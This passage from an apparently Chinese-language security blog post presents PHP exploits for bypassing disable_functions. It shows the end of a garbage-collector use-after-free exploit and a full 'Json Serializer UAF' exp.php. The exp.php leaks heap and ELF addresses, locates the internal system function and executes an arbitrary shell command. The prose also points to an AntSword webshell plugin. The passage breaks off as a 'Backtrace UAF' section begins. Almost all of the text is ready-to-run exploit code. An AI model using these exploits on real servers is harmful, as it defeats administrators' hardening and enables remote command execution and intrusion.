$i++) &#123;            $out .= chr($ptr &amp; <span class="hljs-number">0xff</span>);            $ptr &gt;&gt;= <span class="hljs-number">8</span>;        &#125;        <span class="hljs-keyword">return</span> $out;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;$str, $p, $v, $n = <span class="hljs-number">8</span></span>) </span>&#123;        $i = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $n; $i++) &#123;            $str[$p + $i] = chr($v &amp; <span class="hljs-number">0xff</span>);            $v &gt;&gt;= <span class="hljs-number">8</span>;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params">$addr, $p = <span class="hljs-number">0</span>, $s = <span class="hljs-number">8</span></span>) </span>&#123;        <span class="hljs-keyword">global</span> $abc, $helper;        write($abc, <span class="hljs-number">0x68</span>, $addr + $p - <span class="hljs-number">0x10</span>);        $leak = strlen($helper-&gt;a);        <span class="hljs-keyword">if</span>($s != <span class="hljs-number">8</span>) &#123; $leak %= <span class="hljs-number">2</span> &lt;&lt; ($s * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;        <span class="hljs-keyword">return</span> $leak;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params">$base</span>) </span>&#123;        $e_type = leak($base, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);        $e_phoff = leak($base, <span class="hljs-number">0x20</span>);        $e_phentsize = leak($base, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);        $e_phnum = leak($base, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);            $p_flags = leak($header, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);            $p_vaddr = leak($header, <span class="hljs-number">0x10</span>);            $p_memsz = leak($header, <span class="hljs-number">0x28</span>);            <span class="hljs-keyword">if</span>($p_type == <span class="hljs-number">1</span> &amp;&amp; $p_flags == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span>                <span class="hljs-comment"># handle pie</span>                $data_addr = $e_type == <span class="hljs-number">2</span> ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($p_type == <span class="hljs-number">1</span> &amp;&amp; $p_flags == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span>                $text_size = $p_memsz;            &#125;        &#125;        <span class="hljs-keyword">if</span>(!$data_addr || !$text_size || !$data_size)            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <span class="hljs-keyword">return</span> [$data_addr, $text_size, $data_size];    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params">$base, $elf</span>) </span>&#123;        <span class="hljs-keyword">list</span>($data_addr, $text_size, $data_size) = $elf;        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $data_size / <span class="hljs-number">8</span>; $i++) &#123;            $leak = leak($data_addr, $i * <span class="hljs-number">8</span>);            <span class="hljs-keyword">if</span>($leak - $base &gt; <span class="hljs-number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span>                <span class="hljs-keyword">if</span>($deref != <span class="hljs-number">0x746e6174736e6f63</span>)                    <span class="hljs-keyword">continue</span>;            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;            $leak = leak($data_addr, ($i + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);            <span class="hljs-keyword">if</span>($leak - $base &gt; <span class="hljs-number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span>                <span class="hljs-keyword">if</span>($deref != <span class="hljs-number">0x786568326e6962</span>)                    <span class="hljs-keyword">continue</span>;            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;            <span class="hljs-keyword">return</span> $data_addr + $i * <span class="hljs-number">8</span>;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params">$binary_leak</span>) </span>&#123;        $base = <span class="hljs-number">0</span>;        $start = $binary_leak &amp; <span class="hljs-number">0xfffffffffffff000</span>;        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">0x1000</span>; $i++) &#123;            $addr = $start - <span class="hljs-number">0x1000</span> * $i;            $leak = leak($addr, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);            <span class="hljs-keyword">if</span>($leak == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span>                <span class="hljs-keyword">return</span> $addr;            &#125;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params">$basic_funcs</span>) </span>&#123;        $addr = $basic_funcs;        <span class="hljs-keyword">do</span> &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);            <span class="hljs-keyword">if</span>($f_name == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span>                <span class="hljs-keyword">return</span> leak($addr + <span class="hljs-number">8</span>);            &#125;            $addr += <span class="hljs-number">0x20</span>;        &#125; <span class="hljs-keyword">while</span>($f_entry != <span class="hljs-number">0</span>);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ryat</span> </span>&#123;        <span class="hljs-keyword">var</span> $ryat;        <span class="hljs-keyword">var</span> $chtg;                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;chtg = <span class="hljs-keyword">$this</span>-&gt;ryat;            <span class="hljs-keyword">$this</span>-&gt;ryat = <span class="hljs-number">1</span>;        &#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;        <span class="hljs-keyword">public</span> $a, $b, $c, $d;    &#125;    <span class="hljs-keyword">if</span>(stristr(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);    &#125;    $n_alloc = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span>    $contiguous = [];    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $n_alloc; $i++)        $contiguous[] = str_repeat(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>);    $poc = <span class="hljs-string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;    $out = unserialize($poc);    gc_collect_cycles();    $v = [];    $v[<span class="hljs-number">0</span>] = ptr2str(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);    <span class="hljs-keyword">unset</span>($v);    $abc = $out[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];    $helper = <span class="hljs-keyword">new</span> Helper;    $helper-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">$x</span>) </span>&#123; &#125;;    <span class="hljs-keyword">if</span>(strlen($abc) == <span class="hljs-number">79</span> || strlen($abc) == <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);    &#125;    <span class="hljs-comment"># leaks</span>    $closure_handlers = str2ptr($abc, <span class="hljs-number">0</span>);    $php_heap = str2ptr($abc, <span class="hljs-number">0x58</span>);    $abc_addr = $php_heap - <span class="hljs-number">0xc8</span>;    <span class="hljs-comment"># fake value</span>    write($abc, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);    write($abc, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);    <span class="hljs-comment"># fake reference</span>    write($abc, <span class="hljs-number">0x10</span>, $abc_addr + <span class="hljs-number">0x60</span>);    write($abc, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);    $closure_obj = str2ptr($abc, <span class="hljs-number">0x20</span>);    $binary_leak = leak($closure_handlers, <span class="hljs-number">8</span>);    <span class="hljs-keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(!($elf = parse_elf($base))) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);    &#125;    <span class="hljs-comment"># fake closure object</span>    $fake_obj_offset = <span class="hljs-number">0xd0</span>;    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">0x110</span>; $i += <span class="hljs-number">8</span>) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    <span class="hljs-comment"># pwn</span>    write($abc, <span class="hljs-number">0x20</span>, $abc_addr + $fake_obj_offset);    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span>    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, $zif_system); <span class="hljs-comment"># internal func handler</span>    ($helper-&gt;b)($cmd);    <span class="hljs-keyword">exit</span>();&#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150031808.png"></p><p>或者直接用蚁剑插件</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150031565.png"></p><h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><p>此漏洞利用json序列化程序中的释放后使用漏洞，利用json序列化程序中的堆溢出触发，以绕过disable_functions和执行系统命令</p><p><code>exp.php</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$cmd = <span class="hljs-string">&quot;id&quot;</span>;$n_alloc = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySplFixedArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SplFixedArray</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $leak;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Z</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">JsonSerializable</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;$str, $p, $v, $n = <span class="hljs-number">8</span></span>) </span>&#123;      $i = <span class="hljs-number">0</span>;      <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $n; $i++) &#123;        $str[$p + $i] = chr($v &amp; <span class="hljs-number">0xff</span>);        $v &gt;&gt;= <span class="hljs-number">8</span>;      &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;$str, $p = <span class="hljs-number">0</span>, $s = <span class="hljs-number">8</span></span>) </span>&#123;        $address = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>($j = $s<span class="hljs-number">-1</span>; $j &gt;= <span class="hljs-number">0</span>; $j--) &#123;            $address &lt;&lt;= <span class="hljs-number">8</span>;            $address |= ord($str[$p+$j]);        &#125;        <span class="hljs-keyword">return</span> $address;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params">$ptr, $m = <span class="hljs-number">8</span></span>) </span>&#123;        $out = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $m; $i++) &#123;            $out .= chr($ptr &amp; <span class="hljs-number">0xff</span>);            $ptr &gt;&gt;= <span class="hljs-number">8</span>;        &#125;        <span class="hljs-keyword">return</span> $out;    &#125;    <span class="hljs-comment"># unable to leak ro segments</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak1</span>(<span class="hljs-params">$addr</span>) </span>&#123;        <span class="hljs-keyword">global</span> $spl1;        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">8</span>, $addr - <span class="hljs-number">0x10</span>);        <span class="hljs-keyword">return</span> strlen(get_class($spl1));    &#125;    <span class="hljs-comment"># the real deal</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak2</span>(<span class="hljs-params">$addr, $p = <span class="hljs-number">0</span>, $s = <span class="hljs-number">8</span></span>) </span>&#123;        <span class="hljs-keyword">global</span> $spl1, $fake_tbl_off;        <span class="hljs-comment"># fake reference zval</span>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="hljs-number">0x10</span>, <span class="hljs-number">0xdeadbeef</span>); <span class="hljs-comment"># gc_refcounted</span>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="hljs-number">0x18</span>, $addr + $p - <span class="hljs-number">0x10</span>); <span class="hljs-comment"># zval</span>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="hljs-number">0x20</span>, <span class="hljs-number">6</span>); <span class="hljs-comment"># type (string)</span>        $leak = strlen($spl1::$leak);        <span class="hljs-keyword">if</span>($s != <span class="hljs-number">8</span>) &#123; $leak %= <span class="hljs-number">2</span> &lt;&lt; ($s * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;        <span class="hljs-keyword">return</span> $leak;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params">$base</span>) </span>&#123;        $e_type = <span class="hljs-keyword">$this</span>-&gt;leak2($base, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);        $e_phoff = <span class="hljs-keyword">$this</span>-&gt;leak2($base, <span class="hljs-number">0x20</span>);        $e_phentsize = <span class="hljs-keyword">$this</span>-&gt;leak2($base, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);        $e_phnum = <span class="hljs-keyword">$this</span>-&gt;leak2($base, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = <span class="hljs-keyword">$this</span>-&gt;leak2($header, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);            $p_flags = <span class="hljs-keyword">$this</span>-&gt;leak2($header, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);            $p_vaddr = <span class="hljs-keyword">$this</span>-&gt;leak2($header, <span class="hljs-number">0x10</span>);            $p_memsz = <span class="hljs-keyword">$this</span>-&gt;leak2($header, <span class="hljs-number">0x28</span>);            <span class="hljs-keyword">if</span>($p_type == <span class="hljs-number">1</span> &amp;&amp; $p_flags == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span>                <span class="hljs-comment"># handle pie</span>                $data_addr = $e_type == <span class="hljs-number">2</span> ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($p_type == <span class="hljs-number">1</span> &amp;&amp; $p_flags == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span>                $text_size = $p_memsz;            &#125;        &#125;        <span class="hljs-keyword">if</span>(!$data_addr || !$text_size || !$data_size)            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <span class="hljs-keyword">return</span> [$data_addr, $text_size, $data_size];    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params">$base, $elf</span>) </span>&#123;        <span class="hljs-keyword">list</span>($data_addr, $text_size, $data_size) = $elf;        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $data_size / <span class="hljs-number">8</span>; $i++) &#123;            $leak = <span class="hljs-keyword">$this</span>-&gt;leak2($data_addr, $i * <span class="hljs-number">8</span>);            <span class="hljs-keyword">if</span>($leak - $base &gt; <span class="hljs-number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = <span class="hljs-keyword">$this</span>-&gt;leak2($leak);                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span>                <span class="hljs-keyword">if</span>($deref != <span class="hljs-number">0x746e6174736e6f63</span>)                    <span class="hljs-keyword">continue</span>;            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;            $leak = <span class="hljs-keyword">$this</span>-&gt;leak2($data_addr, ($i + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);            <span class="hljs-keyword">if</span>($leak - $base &gt; <span class="hljs-number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = <span class="hljs-keyword">$this</span>-&gt;leak2($leak);                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span>                <span class="hljs-keyword">if</span>($deref != <span class="hljs-number">0x786568326e6962</span>)                    <span class="hljs-keyword">continue</span>;            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;            <span class="hljs-keyword">return</span> $data_addr + $i * <span class="hljs-number">8</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params">$binary_leak</span>) </span>&#123;        $base = <span class="hljs-number">0</span>;        $start = $binary_leak &amp; <span class="hljs-number">0xfffffffffffff000</span>;        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">0x1000</span>; $i++) &#123;            $addr = $start - <span class="hljs-number">0x1000</span> * $i;            $leak = <span class="hljs-keyword">$this</span>-&gt;leak2($addr, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);            <span class="hljs-keyword">if</span>($leak == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span>                <span class="hljs-keyword">return</span> $addr;            &#125;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params">$basic_funcs</span>) </span>&#123;        $addr = $basic_funcs;        <span class="hljs-keyword">do</span> &#123;            $f_entry = <span class="hljs-keyword">$this</span>-&gt;leak2($addr);            $f_name = <span class="hljs-keyword">$this</span>-&gt;leak2($f_entry, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);            <span class="hljs-keyword">if</span>($f_name == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;leak2($addr + <span class="hljs-number">8</span>);            &#125;            $addr += <span class="hljs-number">0x20</span>;        &#125; <span class="hljs-keyword">while</span>($f_entry != <span class="hljs-number">0</span>);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonSerialize</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">global</span> $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;        $contiguous = [];        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $n_alloc; $i++)            $contiguous[] = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">&#x27;PT1S&#x27;</span>);        $room = [];        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $n_alloc; $i++)            $room[] = <span class="hljs-keyword">new</span> Z();        $_protector = <span class="hljs-keyword">$this</span>-&gt;ptr2str(<span class="hljs-number">0</span>, <span class="hljs-number">78</span>);        <span class="hljs-keyword">$this</span>-&gt;abc = <span class="hljs-keyword">$this</span>-&gt;ptr2str(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);        $p = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">&#x27;PT1S&#x27;</span>);        <span class="hljs-keyword">unset</span>($y[<span class="hljs-number">0</span>]);        <span class="hljs-keyword">unset</span>($p);        $protector = <span class="hljs-string">&quot;.<span class="hljs-subst">$_protector</span>&quot;</span>;        $x = <span class="hljs-keyword">new</span> DateInterval(<span class="hljs-string">&#x27;PT1S&#x27;</span>);        $x-&gt;d = <span class="hljs-number">0x2000</span>;        $x-&gt;h = <span class="hljs-number">0xdeadbeef</span>;        <span class="hljs-comment"># $this-&gt;abc is now of size 0x2000</span>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc) != <span class="hljs-number">0xdeadbeef</span>) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;UAF failed.&#x27;</span>);        &#125;        $spl1 = <span class="hljs-keyword">new</span> MySplFixedArray();        $spl2 = <span class="hljs-keyword">new</span> MySplFixedArray();        <span class="hljs-comment"># some leaks</span>        $class_entry = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>);        $handlers = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x128</span>);        $php_heap = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x1a8</span>);        $abc_addr = $php_heap - <span class="hljs-number">0x218</span>;        <span class="hljs-comment"># create a fake class_entry</span>        $fake_obj = $abc_addr;        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>); <span class="hljs-comment"># type</span>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>, $abc_addr); <span class="hljs-comment"># fake class_entry</span>        <span class="hljs-comment"># copy some of class_entry definition</span>        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">16</span>; $i++) &#123;            <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x10</span> + $i * <span class="hljs-number">8</span>,                 <span class="hljs-keyword">$this</span>-&gt;leak1($class_entry + <span class="hljs-number">0x10</span> + $i * <span class="hljs-number">8</span>));        &#125;        <span class="hljs-comment"># fake static members table</span>        $fake_tbl_off = <span class="hljs-number">0x70</span> * <span class="hljs-number">4</span> - <span class="hljs-number">16</span>;        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x30</span>, $abc_addr + $fake_tbl_off);        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x38</span>, $abc_addr + $fake_tbl_off);        <span class="hljs-comment"># fake zval_reference</span>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + <span class="hljs-number">0x10</span>); <span class="hljs-comment"># zval</span>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="hljs-number">8</span>, <span class="hljs-number">10</span>); <span class="hljs-comment"># zval type (reference)</span>        <span class="hljs-comment"># look for binary base</span>        $binary_leak = <span class="hljs-keyword">$this</span>-&gt;leak2($handlers + <span class="hljs-number">0x10</span>);        <span class="hljs-keyword">if</span>(!($base = <span class="hljs-keyword">$this</span>-&gt;get_binary_base($binary_leak))) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);        &#125;        <span class="hljs-comment"># parse elf header</span>        <span class="hljs-keyword">if</span>(!($elf = <span class="hljs-keyword">$this</span>-&gt;parse_elf($base))) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF&quot;</span>);        &#125;        <span class="hljs-comment"># get basic_functions address</span>        <span class="hljs-keyword">if</span>(!($basic_funcs = <span class="hljs-keyword">$this</span>-&gt;get_basic_funcs($base, $elf))) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);        &#125;        <span class="hljs-comment"># find system entry</span>        <span class="hljs-keyword">if</span>(!($zif_system = <span class="hljs-keyword">$this</span>-&gt;get_system($basic_funcs))) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);        &#125;                <span class="hljs-comment"># copy hashtable offsetGet bucket</span>        $fake_bkt_off = <span class="hljs-number">0x70</span> * <span class="hljs-number">5</span> - <span class="hljs-number">16</span>;        $function_data = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x50</span>);        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">4</span>; $i++) &#123;            <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, $fake_bkt_off + $i * <span class="hljs-number">8</span>,                 <span class="hljs-keyword">$this</span>-&gt;leak2($function_data + <span class="hljs-number">0x40</span> * <span class="hljs-number">4</span>, $i * <span class="hljs-number">8</span>));        &#125;        <span class="hljs-comment"># create a fake bucket</span>        $fake_bkt_addr = $abc_addr + $fake_bkt_off;        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x50</span>, $fake_bkt_addr);        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">3</span>; $i++) &#123;            <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">0x58</span> + $i * <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);        &#125;        <span class="hljs-comment"># copy bucket zval</span>        $function_zval = <span class="hljs-keyword">$this</span>-&gt;str2ptr(<span class="hljs-keyword">$this</span>-&gt;abc, $fake_bkt_off);        <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">12</span>; $i++) &#123;            <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc,  $fake_bkt_off + <span class="hljs-number">0x70</span> + $i * <span class="hljs-number">8</span>,                 <span class="hljs-keyword">$this</span>-&gt;leak2($function_zval, $i * <span class="hljs-number">8</span>));        &#125;        <span class="hljs-comment"># pwn</span>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, $fake_bkt_off + <span class="hljs-number">0x70</span> + <span class="hljs-number">0x30</span>, $zif_system);        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, $fake_bkt_off, $fake_bkt_addr + <span class="hljs-number">0x70</span>);        $spl1-&gt;offsetGet($cmd);        <span class="hljs-keyword">exit</span>();    &#125;&#125;$y = [<span class="hljs-keyword">new</span> Z()];json_encode([&amp;$y]);</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150030316.png"></p><p>或者蚁剑插件</p><h2 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h2><p>该漏洞利用在<code>debug_backtrace()</code>函数中使用了两年的一个 bug。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。</p><p><code>exp.php</code></p><pre><code 